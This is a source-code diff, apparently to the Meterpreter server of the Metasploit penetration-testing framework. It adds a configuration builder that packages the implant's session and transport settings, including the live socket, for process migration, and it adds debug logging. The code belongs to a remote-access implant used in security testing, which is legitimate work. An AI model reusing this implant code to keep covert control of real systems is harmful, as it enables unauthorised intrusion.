@@ -97,7 +97,7 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 		{
 			*size = sizeof(MetsrvTransportTcp);
 		}
-		transport = transport_create_tcp_config((MetsrvTransportTcp*)transportCommon);
+		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon);
 	}
 	else
 	{
@@ -105,7 +105,7 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 		{
 			*size = sizeof(MetsrvTransportHttp);
 		}
-		transport = transport_create_http_config((MetsrvTransportHttp*)transportCommon);
+		transport = transport_create_http((MetsrvTransportHttp*)transportCommon);
 	}
 
 	if (transport == NULL)
@@ -208,6 +208,72 @@ static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports,
 	return TRUE;
 }
 
+static void config_create(Remote* remote, MetsrvConfig** config, PDWORD size)
+{
+	// This function is really only used for migration purposes.
+	DWORD s = sizeof(MetsrvSession);
+	MetsrvSession* sess = (MetsrvSession*)malloc(s);
+	ZeroMemory(sess, s);
+
+	dprintf("[CONFIG] preparing the configuration");
+
+	// start by preparing the session.
+	memcpy(sess->uuid, remote->orig_config->session.uuid, sizeof(sess->uuid));
+	sess->expiry = remote->sess_expiry_end - current_unix_timestamp();
+	sess->exit_func = EXITFUNC_THREAD; // migration we default to this.
+
+	Transport* current = remote->transport;
+	Transport* t = remote->transport;
+	do
+	{
+		// extend memory appropriately
+		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
+
+		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : "http/s", s);
+
+		sess = (MetsrvSession*)realloc(sess, s + neededSize);
+
+		// load up the transport specifics
+		LPBYTE target = (LPBYTE)sess + s;
+
+		ZeroMemory(target, neededSize);
+		s += neededSize;
+
+		if (t->type == METERPRETER_TRANSPORT_SSL)
+		{
+			transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
+			dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
+			dprintf("[CONFIG] TCP Retry Total: %d", ((MetsrvTransportTcp*)target)->common.retry_total);
+			dprintf("[CONFIG] TCP Retry Wait: %d", ((MetsrvTransportTcp*)target)->common.retry_wait);
+			dprintf("[CONFIG] TCP URL: %S", ((MetsrvTransportTcp*)target)->common.url);
+
+			// if the current transport is TCP, copy the socket fd over so that migration can use it.
+			if (t == current)
+			{
+				sess->comms_fd = (DWORD)t->get_socket(t);
+			}
+		}
+		else
+		{
+			transport_write_http_config(t, (MetsrvTransportHttp*)target);
+		}
+
+		t = t->next_transport;
+	} while (t != current);
+
+	// account for the last terminating NULL wchar so that the target knows the list has reached the end,
+	// as well as the end of the extensions list. We may support wiring up existing extensions later on.
+	DWORD terminatorSize = sizeof(wchar_t) + sizeof(DWORD);
+	sess = (MetsrvSession*)realloc(sess, s + terminatorSize);
+	ZeroMemory((LPBYTE)sess + s, terminatorSize);
+	s += terminatorSize;
+
+	// hand off the data
+	dprintf("[CONFIG] Total of %u bytes located at 0x%p", s, sess);
+	*size = s;
+	*config = (MetsrvConfig*)sess;
+}
+
 /*!
  * @brief Setup and run the server. This is called from Init via the loader.
  * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
@@ -221,7 +287,7 @@ DWORD server_setup(MetsrvConfig* config)
 	char desktopName[256] = { 0 };
 	DWORD res = 0;
 
-	dprintf("[SERVER] Initializing...");
+	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
 	dprintf("[SESSION] Comms Fd: %u", config->session.comms_fd);
 	dprintf("[SESSION] UUID: %S", config->session.uuid);
 	dprintf("[SESSION] Expiry: %u", config->session.expiry);
@@ -250,6 +316,7 @@ DWORD server_setup(MetsrvConfig* config)
 				break;
 			}
 
+			remote->orig_config = config;
 			remote->sess_expiry_time = config->session.expiry;
 			remote->sess_start_time = current_unix_timestamp();
 			remote->sess_expiry_end = remote->sess_start_time + config->session.expiry;
@@ -275,6 +342,8 @@ DWORD server_setup(MetsrvConfig* config)
 
 			// Set up the transport creation function pointer
 			remote->trans_create = create_transport;
+			// and the config creation pointer
+			remote->config_create = config_create;
 
 			// Store our thread handle
 			remote->server_thread = serverThread->handle;
@@ -330,8 +399,10 @@ DWORD server_setup(MetsrvConfig* config)
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
 				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);
 
+				dprintf("[DISPATCH] dispatch exited with result: %u", dispatchResult);
 				if (remote->transport->transport_deinit)
 				{
+					dprintf("[DISPATCH] deinitialising transport");
 					remote->transport->transport_deinit(remote->transport);
 				}
 
@@ -356,6 +427,7 @@ DWORD server_setup(MetsrvConfig* config)
 				}
 				else
 				{
+					dprintf("[DISPATCH] resetting transport");
 					// try again!
 					if (remote->transport->transport_reset)
 					{
